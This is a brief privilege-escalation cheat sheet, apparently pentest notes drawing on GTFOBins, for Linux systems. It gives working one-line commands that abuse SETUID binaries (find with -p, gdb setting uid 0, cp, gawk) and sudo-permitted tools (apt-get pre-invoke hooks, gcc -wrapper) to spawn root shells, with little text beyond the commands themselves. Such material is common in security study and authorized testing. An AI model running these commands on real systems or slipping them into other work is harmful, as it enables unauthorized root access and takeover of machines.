We can use the [GTFOBins](https://gtfobins.github.io/gtfobins/) to read existent exploitation for binaries in Linux. Below more examples.

### SETUID

#### find

find utils can be abused and can execute a shell. We use `-p` to preventing the effective user from being reset.

```shell
find /home/joe/Desktop -exec "/usr/bin/bash" -p \;
```

#### gdb

```shell
/usr/bin/gdb -nx -ex 'python import os; os.setuid(0)' -ex '!sh' -ex quit
```

#### cp

```shell
LFILE=file_to_change
/usr/bin/cp --attributes-only --preserve=all ./cp "$LFILE"
```

#### gawk

```shell
/usr/bin/gawk 'BEGIN {system("/bin/sh")}'
```

### SUDO

In the file `/etc/sudoers` the sysadmin can specify which commands the users can run with the "sudo" keyword that can be used to run the command with elevated privileges. This could led to a many exploit tecniques that we can find referring to GTFObins. Normally users that can run "sudo" are the users listed in the `sudo group`.

#### apt

```shell
sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh
```

#### gcc

```shell
sudo gcc -wrapper /bin/sh,-s .
```